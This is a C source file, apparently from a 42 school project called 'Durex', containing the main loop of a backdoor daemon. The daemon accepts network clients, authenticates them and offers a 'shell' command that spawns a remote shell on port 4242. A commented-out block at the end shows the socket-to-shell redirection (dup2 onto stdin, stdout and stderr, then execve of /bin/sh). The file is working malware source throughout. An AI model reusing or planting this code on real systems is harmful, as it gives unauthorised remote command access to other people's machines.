/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_daemon.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/09 12:00:08 by user42            #+#    #+#             */
/*   Updated: 2022/02/13 15:06:41 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void	durex_daemon(void)
{
	t_server	server;
	t_client	*tmp;
	int			rc;

	setup_server(&server);
	server.server_mode = DAEMON;

	while (1)
	{
		server.read_set = server.write_set = server.master_set;
		if (select(server.max_sd + 1, &(server.read_set), &(server.write_set), 0, 0) < 0)
			continue ;
		
		for (int i = 0; i <= server.max_sd; i++)
		{
			if (FD_ISSET(i, &(server.read_set)))
			{
				if (i == server.listen_sd)
				{
					add_client(&server);
					break ;
				}

				else
				{
					tmp = get_client_from_fd(&server, i);
					rc = recv(i, server.buff, RECV_SIZE - 1, 0);
					if (rc <= 0)
					{
						shutdown_connection(&server, tmp);
						break ;
					}
					else
					{
						server.buff[rc] = '\0';
						server.buff[strcspn(server.buff, "\n")] = '\0';
						if (!tmp->auth)
							authenticate(&server, tmp);
						else
						{
							if (!strcmp(server.buff, "?"))
								send_info(&server, i, "?		show this help\nshell		Spawn shell on 4242\nexit		Close connection\n$> ");
							else if (!strcmp(server.buff, "shell"))
							{
								durex_shell(&server);
								break ;
							}
							else if (!strcmp(server.buff, "exit"))
							{
								send_info(&server, i, "Bye!");
								shutdown_connection(&server, tmp);
								break ;
							}
							else
								send_info(&server, i, "$> ");
						}
					}
				}
			}
		}
	}
}







/*


	pid = fork();
	if (pid == 0)
	{
		

		dup2(client_sock, 0);
		dup2(client_sock, 1);
		dup2(client_sock, 2);

		execve("/bin/sh", args, NULL);
		close(server->listen_sd);
	}
	else
	{
		waitpid(pid, &status, 0);
		durex_daemon();
	}


*/
